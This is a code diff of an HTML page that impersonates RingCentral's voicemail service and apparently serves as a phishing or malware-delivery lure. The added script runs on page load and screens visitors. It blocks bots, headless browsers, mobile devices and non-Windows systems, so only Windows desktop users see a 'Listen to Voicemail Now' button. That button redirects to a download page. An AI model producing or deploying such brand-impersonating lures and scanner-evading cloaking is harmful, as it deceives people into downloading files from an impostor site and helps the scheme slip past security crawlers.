@@ -81,13 +81,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .loading-text {
@@ -135,10 +130,59 @@
             background-color: #0f4c8c;
         }
 
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
         .footer {
             font-size: 12px;
             color: #9aa0a6;
             margin-top: 20px;
+        }
+
+        .icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .access-denied {
+            background: rgba(220, 53, 69, 0.1);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+        }
+
+        .mobile-warning {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+
+        .bot-blocked {
+            background: rgba(108, 117, 125, 0.1);
+            border: 1px solid rgba(108, 117, 125, 0.3);
+        }
+
+        .system-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+
+        .warning-icon { color: #ffc107; }
+        .error-icon { color: #dc3545; }
+        .success-icon { color: #28a745; }
+        .bot-icon { color: #6c757d; }
+
+        .hidden {
+            display: none;
         }
 
         /* Mobile Responsiveness */
@@ -201,56 +245,145 @@
         }
 
         @keyframes pulse {
-
-            0%,
-            60%,
-            100% {
-                background-color: #e8eaed;
-            }
-
-            30% {
-                background-color: #1a73e8;
-            }
+            0%, 60%, 100% { background-color: #e8eaed; }
+            30% { background-color: #1a73e8; }
         }
     </style>
-</head> \
+</head>
 
 <body>
-    <div class="container">
-        <div class="logo">
-            <div class="logo-text">
-                <span class="ring">Ring</span><span class="central">Central</span>
+    <div class="container" id="mainContainer">
+        <div id="loadingScreen">
+            <div class="loading"></div>
+            <p>Verifying access permissions...</p>
+        </div>
+        <div id="accessDenied" class="hidden access-denied">
+            <span class="icon error-icon">🚫</span>
+            <h1>Access Denied</h1>
+            <p>Sorry, access to this resource is restricted. This could be due to:</p>
+            <ul style="text-align: left; margin: 20px 0; padding-left: 20px;">
+                <li>Automated access attempts are not permitted</li>
+                <li>Your operating system is not supported (Windows required)</li>
+                <li>Your browser configuration doesn't meet our requirements</li>
+            </ul>
+            <p>Please access this site from a Windows system with a standard web browser.</p>
+            <div class="system-info">
+                <strong>Your device:</strong> <span id="deviceInfo"></span>
             </div>
         </div>
-
-        <h1 class="title">Preparing Your Secure Voicemail</h1>
-
-        <p class="subtitle">
-            RingCentral is securely downloading your latest voicemails. Hang tight, this will only take a moment.
-        </p>
-
-        <div class="loading-container">
-            <div class="spinner"></div>
-            <div class="loading-text">Verifying download permissions</div>
-            <div class="progress-dots">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+        <div id="mobileWarning" class="hidden mobile-warning">
+            <span class="icon warning-icon">📱</span>
+            <h1>Mobile Access Detected</h1>
+            <p>For security and optimal performance, please access this site from a PC or desktop computer.</p>
+            <p>Mobile downloads are not supported at this time.</p>
+            <div class="system-info">
+                <strong>Your device:</strong> <span id="deviceInfo"></span>
             </div>
         </div>
-
-        <button class="download-btn" onclick="downloadVoicemail()">
-            Listen to Voicemail Now
-        </button>
-
-        <div class="footer">
-            2025 RingCentral, Inc. All rights reserved.
+        <div id="botBlocked" class="hidden bot-blocked">
+            <span class="icon bot-icon">🤖</span>
+            <h1>Bot Access Blocked</h1>
+            <p>Automated access is not permitted. Please verify you are a human user.</p>
+            <p>Complete the challenge below to proceed.</p>
+            <button id="verifyButton" class="download-btn" onclick="verifyHuman()">Verify I'm Human</button>
+            <div class="system-info">
+                <strong>Status:</strong> <span id="botStatus"></span>
+            </div>
+        </div>
+        <div id="mainContent" class="hidden">
+            <div class="logo">
+                <div class="logo-text">
+                    <span class="ring">Ring</span><span class="central">Central</span>
+                </div>
+            </div>
+            <h1 class="title">Preparing Your Secure Voicemail</h1>
+            <p class="subtitle">
+                RingCentral is securely downloading all your latest voicemails. Hang tight, this will only take a moment.
+            </p>
+            <div class="loading-container">
+                <div class="spinner"></div>
+                <div class="loading-text">Verifying download permissions</div>
+                <div class="progress-dots">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+            <button class="download-btn" onclick="downloadVoicemail()">
+                Listen to Voicemail Now
+            </button>
+            <div class="footer">
+                2025 RingCentral, Inc. All rights reserved.
+            </div>
         </div>
     </div>
 
     <script>
+        // Device, OS, and bot detection
+        function checkAccess() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const loadingScreen = document.getElementById('loadingScreen');
+            const accessDenied = document.getElementById('accessDenied');
+            const mobileWarning = document.getElementById('mobileWarning');
+            const botBlocked = document.getElementById('botBlocked');
+            const mainContent = document.getElementById('mainContent');
+            const deviceInfo = document.getElementById('deviceInfo');
+            const botStatus = document.getElementById('botStatus');
+
+            // Detect mobile devices
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            // Detect OS (simplified check for Windows)
+            const isWindows = /Win/i.test(navigator.platform);
+            // Simple bot check: headless browsers or common bot signatures
+            const isBot = /bot|spider|crawl|slurp|teoma|ia_archiver/i.test(userAgent.toLowerCase()) || navigator.webdriver;
+
+            // Update device info
+            deviceInfo.textContent = `${isMobile ? 'Mobile' : 'Desktop'} - ${isWindows ? 'Windows' : navigator.platform}`;
+            botStatus.textContent = isBot ? 'Suspected Bot' : 'Human (Verified)';
+
+            if (isBot) {
+                loadingScreen.classList.add('hidden');
+                botBlocked.classList.remove('hidden');
+                mainContent.classList.add('hidden');
+                accessDenied.classList.add('hidden');
+                mobileWarning.classList.add('hidden');
+            } else if (isMobile) {
+                loadingScreen.classList.add('hidden');
+                mobileWarning.classList.remove('hidden');
+                mainContent.classList.add('hidden');
+                accessDenied.classList.add('hidden');
+                botBlocked.classList.add('hidden');
+            } else if (!isWindows) {
+                loadingScreen.classList.add('hidden');
+                accessDenied.classList.remove('hidden');
+                mainContent.classList.add('hidden');
+                mobileWarning.classList.add('hidden');
+                botBlocked.classList.add('hidden');
+            } else {
+                loadingScreen.classList.add('hidden');
+                mainContent.classList.remove('hidden');
+                setTimeout(() => {
+                    const dots = document.querySelectorAll('.dot');
+                    dots.forEach((dot, index) => {
+                        setTimeout(() => dot.classList.add('active'), index * 500);
+                    });
+                }, 1000);
+            }
+        }
+
+        // Verify human interaction
+        let isHumanVerified = false;
+        function verifyHuman() {
+            const botStatus = document.getElementById('botStatus');
+            // Simple challenge: ensure user interaction
+            isHumanVerified = true;
+            botStatus.textContent = 'Human (Verified)';
+            document.getElementById('mainContent').classList.remove('hidden');
+            document.getElementById('botBlocked').classList.add('hidden');
+        }
+
+        // Voicemail download function
         function downloadVoicemail() {
-            // Simulate download process
             const button = document.querySelector('.download-btn');
             const originalText = button.textContent;
 
@@ -258,12 +391,15 @@
             button.disabled = true;
             button.style.backgroundColor = '#5f6368';
 
-            setTimeout(function () {
+            setTimeout(() => {
                 window.location.href = 'ringdownload.html';
             }, 4000);
         }
 
-        // Add some dynamic behavior to the loading animation
+        // Initialize access check on page load
+        window.onload = checkAccess;
+
+        // Dynamic loading animation
         setInterval(() => {
             const spinner = document.querySelector('.spinner');
             spinner.style.animationDuration = Math.random() * 0.5 + 0.8 + 's';
